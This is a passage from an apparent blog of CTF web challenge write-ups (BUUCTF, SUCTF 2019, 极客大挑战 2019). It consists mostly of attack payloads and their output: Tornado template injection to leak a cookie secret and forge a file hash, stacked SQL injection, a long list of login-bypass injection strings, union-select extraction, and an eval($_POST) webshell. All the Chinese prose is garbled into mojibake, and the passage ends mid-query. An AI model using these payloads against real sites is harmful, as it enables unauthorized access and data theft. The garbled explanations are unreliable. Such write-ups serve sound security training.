operator">=</span><span class="token operator">/</span>fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span><span class="token string backtick-quoted-string">`md5(cookie_secret+md5(/fllllllllllllag))`</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç°åœ¨ä¸»è¦å°±æ˜¯æ‰¾<code>cookie_secret</code></p><p>renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µ renderé…åˆTornadoä½¿ç”¨ï¼Œä»<code>render</code>å¯ä»¥çŒœæµ‹æ˜¯æ¨¡æ¿æ³¨å…¥</p><p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡,è¿™é‡Œç”¨åˆ°çš„æ˜¯handler.settingsï¼Œhandler æŒ‡å‘RequestHandlerï¼Œè€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settingsï¼Œæ‰€ä»¥handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬çš„ä¸€äº›ç¯å¢ƒå˜é‡</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloaderror<span class="token operator">?</span>msg<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>handler<span class="token operator">.</span>settings<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string single-quoted-string">'autoreload'</span><span class="token punctuation">:</span> <span class="token constant boolean">True</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'compiled_template_cache'</span><span class="token punctuation">:</span> <span class="token constant boolean">False</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cookie_secret'</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'591f8ab1-795d-4d61-9975-6da84c69a663'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç”¨è„šæœ¬è·‘å¾—åˆ°filehash</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>filename<span class="token operator">=</span><span class="token string">'/fllllllllllllag'</span>cookie_secret<span class="token operator">=</span><span class="token string">"591f8ab1-795d-4d61-9975-6da84c69a663"</span><span class="token builtin">hash</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s1<span class="token operator">=</span><span class="token builtin">hash</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">hash</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>s1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>610463dc2fc8906a2682dd82ca291cec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆpayload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span><span class="token number">610463</span>dc2fc8906a2682dd82ca291cec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF_2019 EasySQL</title>
      <link href="/2021/03/01/suctf-2019-easysql/"/>
      <url>/2021/03/01/suctf-2019-easysql/</url>
      
        <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>æ‰“å¼€æºç å¾—åˆ°</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„postä¼ å‚ï¼Œå‚æ•°åquery</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">query<span class="token operator">=</span><span class="token number">11</span> <span class="token operator">%</span><span class="token number">23</span><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> <span class="token number">11</span> <span class="token punctuation">)</span><span class="token comment">//å›æ˜¾ç‚¹è²Œä¼¼åªæœ‰ä¸€ä¸ª</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™é“wafè¿‡æ»¤äº†å¤ªå¤šå…³é”®è¯äº†ï¼Œåˆæƒ³åˆ°å †å æ³¨å…¥</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">query<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>show databases<span class="token punctuation">;</span> <span class="token operator">%</span><span class="token number">23</span><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> ctf <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> ctftraining <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> information_schema <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> mysql <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> performance_schema <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> test <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">query<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>show tables<span class="token punctuation">;</span> <span class="token operator">%</span><span class="token number">23</span><span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">Array</span> <span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=&gt;</span> Flag <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>çŒœæµ‹flagåœ¨Flagè¡¨é‡Œ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select "</span><span class="token operator">.</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"||flag from Flag"</span><span class="token punctuation">;</span><span class="token comment">//ä¸çŸ¥é“å“ªå„¿æ¥çš„æºç </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™é‡Œå°±è½¬ä¸ºå¯¹||çš„å¤„ç†</p><p>ç¬¬ä¸€ç§ç›´æ¥ç”¨*æŸ¥è¯¢å…¨éƒ¨</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadquery<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">//select *,1||flag from Flag  ç­‰æ•ˆäºselect *,1 from Flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç¬¬äºŒç§ ä½¿ç”¨<code>set sql_mode=PIPES_AS_CONCAT;</code>å°†||è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadquery<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>set sql_mode<span class="token operator">=</span>pipes_as_concat<span class="token punctuation">;</span>select <span class="token number">1</span><span class="token comment">// '||' å‰é¢æ˜¯çœŸå°±ä¼šè·³è¿‡åé¢</span><span class="token comment">//select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag</span><span class="token comment">//1||flagåˆå¹¶æˆä¸€ä¸ªå•ä½å›æ˜¾</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é¢˜ç›®æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span>    <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">global</span> <span class="token variable">$MysqlLink</span><span class="token punctuation">;</span>    <span class="token comment">//GetPara();</span>    <span class="token variable">$MysqlLink</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$datauser</span><span class="token punctuation">,</span><span class="token variable">$datapass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Mysql Connect Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$selectDB</span> <span class="token operator">=</span> <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$dataName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$selectDB</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Choose Database Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">//die();</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">&gt;</span></span> Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$BlackList</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span><span class="token punctuation">;</span>        <span class="token comment">//var_dump(preg_match("/{$BlackList}/is",$post['query']));</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$BlackList</span><span class="token punctuation">}</span></span>/is"</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//echo $post['query'];</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select "</span><span class="token operator">.</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"||flag from Flag"</span><span class="token punctuation">;</span>        <span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">do</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>@<span class="token function">mysqli_next_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜_2019 EasySQL</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-easysql/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-easysql/</url>
      
        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p>è¿™æ˜¯ä¸€é“sqlæ³¨å…¥çš„é¢˜</p><p>è¿›å…¥é¢˜ç›®  ä¸¤ä¸ªè¾“å…¥æ¡† ç”¨æˆ·åï¼Œå¯†ç </p><p>çŒœæµ‹å¼±å¯†ç ï¼Œadmin passwd ä¸è¡Œ</p><p>è¾“å…¥â€™æŠ¥é”™  å¯ä»¥æ³¨å…¥</p><p>è¿™é‡Œå¯ä»¥ç”¨ä¸‡èƒ½å¯†ç æ³¨å…¥</p><p>php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">'or 1=1/&lt;br/&gt;"or "a"="a&lt;br/&gt;"or 1=1--&lt;br/&gt;"or"="&lt;br/&gt;"or"="a'='a&lt;br/&gt;"or1=1--&lt;br/&gt;"or=or"&lt;br/&gt;''or'='or'&lt;br/&gt;') or ('a'='a&lt;br/&gt;'.).or.('.a.'='.a&lt;br/&gt;'or 1=1&lt;br/&gt;'or 1=1--&lt;br/&gt;'or 1=1/&lt;br/&gt;'or"="a'='a&lt;br/&gt;'or' '1'='1'&lt;br/&gt;'or''='&lt;br/&gt;'or''=''or''='&lt;br/&gt;'or'='1'&lt;br/&gt;'or'='or'&lt;br/&gt;'or.'a.'='a&lt;br/&gt;'or1=1--&lt;br/&gt;1'or'1'='1&lt;br/&gt;a'or' 1=1--&lt;br/&gt;a'or'1=1--&lt;br/&gt;or 'a'='a'&lt;br/&gt;or 1=1--&lt;br/&gt;or1=1--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>asp</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">"or "a"="a&lt;br/&gt;'.).or.('.a.'='.a &lt;br/&gt;or 1=1--&lt;br/&gt;'or 1=1--&lt;br/&gt;a'or' 1=1--&lt;br/&gt;"or 1=1--&lt;br/&gt;'or.'a.'='a&lt;br/&gt;"or"="a'='a&lt;br/&gt;'or''='&lt;br/&gt;or'='or'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>jsp</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">1'or'1'='1&lt;br/&gt;admin' or 1=1/*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çŒœæµ‹sqlè¯­å¥</p><p>username=â€™uesrnameâ€™ and passwd=â€™passwordâ€™</p><p>æ„é€ payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>admin<span class="token string single-quoted-string">' or '</span><span class="token number">1</span><span class="token string single-quoted-string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token string single-quoted-string">' or '</span><span class="token number">1</span><span class="token string single-quoted-string">'='</span><span class="token number">1</span>check<span class="token operator">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>1åé¢â€™å’Œå‰é¢çš„é—­åˆ</p><p>æˆåŠŸ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜_2019 Knife</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-knife/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-knife/</url>
      
        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"Syc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰¾èœåˆ€ï¼Œå†ç»“åˆè¿™ä¸ª<code>eval($_POST["Syc"]);</code>åé—¨</p><p>ç”¨èšå‰‘è¿æ¥ï¼Œå¯†ç Syc</p><p>å‘ç°flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜_2019 LoveSQL</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-lovesql/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-lovesql/</url>
      
        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p>å°è¯•ä¸‡èƒ½å¯†ç ç™»å½•</p><p><code>Hello adminï¼Your password is '1eb26772fe42a42d3ef6a247e970d1ee'</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadcheck<span class="token operator">.</span>php<span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token string single-quoted-string">' or '</span><span class="token number">1</span><span class="token string single-quoted-string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span><span class="token comment">//ç™»å½•æˆåŠŸï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åŠ <code>'</code>æŠ¥é”™ï¼Œç»æ’æŸ¥ï¼Œæ²¡æœ‰è¿‡æ»¤é™åˆ¶ï¼Œç›´æ¥æ³¨å…¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin<span class="token string">' order by 4 %23&amp;password=2Unknown column '</span><span class="token number">4</span><span class="token string">' in '</span><span class="token keyword">order</span> clause'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span>admin' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>Login Success<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,3 %23&amp;password=2Hello 2ï¼Your password is '</span><span class="token number">3</span>'<span class="token comment">//ä¸¤ä¸ªå›æ˜¾ç‚¹</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,version(),database() %23&amp;password=2Hello 10.3.18-MariaDBï¼Your password is '</span>geek'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 